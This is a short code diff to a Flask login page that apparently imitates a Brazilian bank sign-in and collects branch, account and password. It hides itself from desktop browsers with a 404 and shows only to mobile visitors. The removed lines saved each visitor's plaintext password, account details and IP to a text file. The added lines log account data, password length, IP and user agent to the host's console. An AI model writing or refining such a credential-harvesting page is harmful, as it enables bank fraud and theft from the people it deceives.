@@ -87,6 +87,7 @@ HTML_LOGIN = """
 def login():
     user_agent = request.headers.get('User-Agent', '').lower()
 
+    # PC → 404
     if 'mobile' not in user_agent:
         abort(404)
 
@@ -107,20 +108,17 @@ def login():
             erro = 'Senha inválida.'
 
         else:
-            # ===== REGISTRO EM TXT =====
-            registro = f"""
-==============================
-Data/Hora: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}
-Agência: {agencia}
-Conta: {conta}
-Senha: {senha}
-IP: {request.remote_addr}
-Dispositivo: Mobile
-==============================
-"""
-
-            with open("registros.txt", "a", encoding="utf-8") as arquivo:
-                arquivo.write(registro)
+            # ===== LOG NO RENDER =====
+            print("=== NOVO ACESSO ===")
+            print("Data/Hora:", datetime.now().strftime('%d/%m/%Y %H:%M:%S'))
+            print("Agência:", agencia)
+            print("Conta:", conta)
+            print("Senha: [DIGITADA CORRETAMENTE]")
+            print("Tamanho da senha:", len(senha))
+            print("IP:", request.remote_addr)
+            print("User-Agent:", request.headers.get('User-Agent'))
+            print("Dispositivo: Mobile")
+            print("===================")
 
             return "<h2>Acesso autorizado</h2>"
 
